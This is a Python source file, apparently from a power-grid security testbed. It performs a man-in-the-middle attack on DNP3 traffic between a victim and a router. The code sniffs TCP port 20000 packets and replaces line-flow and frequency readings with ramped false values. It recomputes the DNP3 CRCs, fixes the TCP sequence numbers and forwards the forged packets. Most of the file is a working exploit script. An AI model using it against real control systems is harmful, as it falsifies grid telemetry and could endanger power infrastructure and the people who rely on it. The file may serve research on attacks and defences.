from bitstring import BitArray
from scapy.all import *
from uuid import getnode as get_mac
from calc_crc import calc_crc_chksum
from helpers import *
import argparse
import signal
import sys
import logging
import time
import stealthy_attack as attack

s = conf.L2socket(iface='eth0')
victimIP=""
routerIP=""
victimMAC=""
routerMAC=""
myMAC=""
interface=""
initial_time=time.time()
previous_meas=[0.0,0.0,0.0]
previous_attack_val=[0.0,0.0,0.0]

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
	parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")
	parser.add_argument("-vmac", "--victimMAC", help="Choose the victim MAC address. Example: -vmac 00:11:22:33:44:55")
	parser.add_argument("-rmac", "--routerMAC", help="Choose the router MAC address. Example: -rmac 11:22:33:44:55:66")
	parser.add_argument("-mmac", "--myMAC", help="my (attacker) MAC. Example: -mmac 11:22:33:44:55:66")
	parser.add_argument("-i", "--interface", help="interface to listen on Example: eth0")
	return parser.parse_args()

def callback(pkt):
	#modify packet here
	#print pkt.show()
        if("TCP" in pkt and "Raw" in pkt):
		#print pkt.show()
		if(pkt[TCP].sport==20000):
			cache=pkt[Raw].load
			payload = pkt[Raw].load
			old_len=len(payload)
			#print "PAY LEN:"+str(old_len)
			proceed=0
			value_dnp1=0
			#This corresponds to the Line flows on PL45,PL69, and frequency
			attack_targets=[0,1,2]
			if len(payload)==17:
				proceed=0
				#print "PAYLOAD DOES NOT HAVE ANY CHANGE DATA!"
			elif len(payload)>17 and attack.is_fpt_change(payload):
				# if floating point change is present we modify appropriately
				# We determine the location of the application chunks and CRCs
				crc_pos=attack.crc_locations(payload)
				# In order to keep our analysis easy, we trim out the CRCs and calculate them later
				[trim_pyld,initial_pyld]=attack.trim_crc(payload,crc_pos)
				# We now read the particular item we want to change and change it
				err_values=[0,0,0]
				index=0
				
				for i in attack_targets:
					[value,err_values[index]]=attack.get_item(i,trim_pyld)
					if err_values[index]==0:
						previous_meas[index]=value
						# If the payload has those variables, we called the attack functions to find
						# what values need to be replaced
						#previous_attack_val=attack.scaling(previous_meas[index])
						# Ramp attack depends on time, so we calculate elapsed time
						current_time=time.time()
						tdiff=current_time-initial_time
						previous_attack_val[index]=attack.ramp(previous_meas[index],tdiff)
						
						# Choose a random value between the two limits
						ulim=10 # MW
						llim= 5 # MW
						#previous_attack_val=attack.rand(ulim,llim)
						# We need to calculate the frequency measurement based on the other values
						if i==2:
							previous_attack_val[index]=previous_meas[i]-(previous_attack_val[0]+previous_attack_val[1])/((3/5.0)*100)
						
						# We need to add the attack value to the unchanged value
						new_val=previous_attack_val[index]
						# We insert the value back into the payload
						[trim_pyld,err]=attack.put_item(i,new_val,trim_pyld)
					index+=1
					
				# When we are ready to join, we use this function to put things back together
				payload_joined=attack.join_crc(trim_pyld,initial_pyld)
				
				# We just pass the payload on to the rest of the program for retransmission
				pkt[Raw].load=payload_joined
				pkt[Raw].load=cache
				del pkt[IP].chksum
				del pkt[TCP].chksum
				del pkt[IP].len
				#fix seq number
				pkt[TCP].seq=pkt[TCP].seq - old_len + len(payload)
				
			elif len(payload)>200 and attack.is_integrity_poll(payload):
				# This is an integrity poll
				#print "THIS IS INTEGRITY POLL"
				#caution: crc_locations takes only length from floating point section
				crc_pos=attack.crc_locations_int_poll(len(payload[190:]))
				#print str(crc_pos)
				[trim_pyld,initial_pyld]=attack.trim_crc_int_poll(payload,crc_pos)
				#we get the items we need to change the values based on the attack templates
				# We now read the particular item we want to change and change it
				err_values=[0,0,0]
				index=0
				
				for i in attack_targets:
					[value,err_values[index]]=attack.get_item_int_poll(i,trim_pyld)
					if err_values[index]==0:
						previous_meas[index]=value
						# If the payload has those variables, we called the attack functions to find
						# what values need to be replaced
						#previous_attack_val[index]=attack.scaling(previous_meas[index])
						# Ramp attack depends on time, so we calculate elapsed time
						current_time=time.time()
						tdiff=current_time-initial_time
						previous_attack_val[index]=attack.ramp(previous_meas[index],tdiff)
						
						# Choose a random value between the two limits
						ulim=10 # MW
						llim= 5 # MW
						#previous_attack_val[index]=attack.rand(ulim,llim)
						# We need to calculate the frequency measurement based on the other values
						if i==2:
							previous_attack_val[index]=previous_meas[i]-(previous_attack_val[0]+previous_attack_val[1])/((3/5.0)*100)
						
						# We need to add the attack value to the unchanged value
						new_val=previous_attack_val[index]
						# We insert the value back into the payload
						[trim_pyld,err]=attack.put_item_int_poll(i,new_val,trim_pyld)
					index+=1
				# we need to add the crc's before sending them on their way
				payload_joined=attack.join_crc_int_poll(trim_pyld,initial_pyld)
				# We just pass the payload on to the rest of the program for retransmission
				pkt[Raw].load=payload_joined
				#pkt[Raw].load=cache
				del pkt[IP].chksum
				del pkt[TCP].chksum
				del pkt[IP].len
				#fix seq number
				pkt[TCP].seq=pkt[TCP].seq - old_len + len(payload)
			
			elif len(payload)>1000:
				# We extract a portion and check if that is part of an integrity poll
				drop=1
				fd=open('pcap.txt','a')
				fd.write(payload.encode('hex'))
				fd.write("++++++++++++++++++++")
				fd.close()
				pyld=payload[584:876]
				if pyld[0]=='\x05' and pyld[1]=='\x64':
					#print "Found it"
					val=1
				#print payload.encode('hex')
				index=0
				for char in payload:
					if index==(len(payload)-5):
						break
					elif (payload[index]=='\x01' and payload[index+1]=='\x1e' and payload[index+2]=='\x05' and payload[index+3]=='\x01'):
						#print "FOUnd you:"+str(index)
						fd=open('pcap_index.txt','a')
						fd.write(str(index))
						fd.write("\n")
						fd.close()
						break
					index+=1
			
	if pkt[IP].dst == victimIP and pkt.dst == myMAC:
		pkt.dst=victimMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)
	elif pkt[IP].dst == routerIP and pkt.dst == myMAC:
		pkt.dst=routerMAC
		pkt.src=myMAC
		#fragments large packets
		if(len(pkt) > 1514):
			#print len(pkt)
			pkt = fragment(pkt)
			for p in pkt:
				s.send(p)
		else:
			s.send(pkt)
	toc=time.time()
def main(args):
	if os.geteuid() != 0:
		sys.exit("[!] Please run as root")
	global routerIP
	global victimIP
	global routerMAC
	global victimMAC
	global myMAC
	global interface
	routerIP= args.routerIP
	victimIP = args.victimIP
	routerMAC = args.routerMAC
	victimMAC = args.victimMAC
	if(routerMAC == None):
		routerMAC = get_mac_from_ip(routerIP)
	if(victimMAC == None):
		victimMAC = get_mac_from_ip(victimIP)
	myMAC = args.myMAC
	if(myMAC == None):
		myMAC = get_my_mac()
	interface = args.interface
	if(interface == None):
		interface = "eth0"
	print "Forwarding for router ---> IP: "+routerIP+"  Mac Address: "+routerMAC
	print "Forwarding for victim ---> IP: "+victimIP+"  Mac Address: "+victimMAC+"\n"
	filter_text = "ip and ether dst host " + myMAC + " and(dst net " + victimIP  + " or dst net " + routerIP  + ")"
	sniff(filter=filter_text, prn=callback, store=0, iface=interface)
main(parse_args())



